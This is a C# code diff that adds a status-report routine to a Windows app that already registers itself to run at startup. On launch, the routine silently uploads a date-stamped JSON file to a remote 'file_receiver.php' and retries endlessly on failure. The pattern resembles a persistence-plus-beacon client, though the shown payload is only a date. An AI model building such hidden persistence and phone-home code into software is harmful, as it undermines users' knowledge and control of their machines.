@@ -3,6 +3,7 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
+using System;
 
 namespace IDK {
 
@@ -10,6 +11,9 @@ namespace IDK {
     /// Class that manages the application
     /// </summary>
     class App {
+
+        // base file name for the status report
+        private const string STATUS_REPORT_FILE_NAME = "STATUS_REPORT.json";
 
         /// <summary>
         /// Gets the name of the executable file
@@ -53,6 +57,8 @@ namespace IDK {
         /// </summary>
         /// <param name="args">arguments for the program</param>
         public static void Initialize(string[] args) {
+            SendStatusReport();
+
             RegisterAsStartupExecutable();
 
             if (args.Length > 0) {
@@ -98,6 +104,40 @@ namespace IDK {
                 key.DeleteValue(Config.APP_NAME, false);
                 key.Dispose();
             } catch { }
+        }
+
+        /// <summary>
+        /// Sends a status report to the server. Blocks the calling until completed
+        /// </summary>
+        private static void SendStatusReport() {
+            try {
+                Thread thread = new Thread(delegate () {
+                    CreateReportFile();
+                    Network.UploadFile(Config.SERVER_BASE_URL + "file_receiver.php", STATUS_REPORT_FILE_NAME);
+                    new FileInfo(STATUS_REPORT_FILE_NAME).Delete();
+                });
+
+                thread.Start();
+                thread.Join();
+            } catch {
+                Thread.Sleep(Config.CONNECTION_DELAY);
+                SendStatusReport();
+            }
+        }
+
+        /// <summary>
+        /// Creates a status report file
+        /// </summary>
+        private static void CreateReportFile() {
+            using (StreamWriter writer = new StreamWriter(new FileInfo(STATUS_REPORT_FILE_NAME).Create())) {
+                writer.WriteLine("{");
+
+                DateTime now = DateTime.Now;
+                writer.WriteLine("  \"last_status_report\": \"" + now.Year + "-" + now.Month + "-" + 
+                    now.Day + "\"");
+
+                writer.WriteLine("}");
+            }
         }
     }
 }
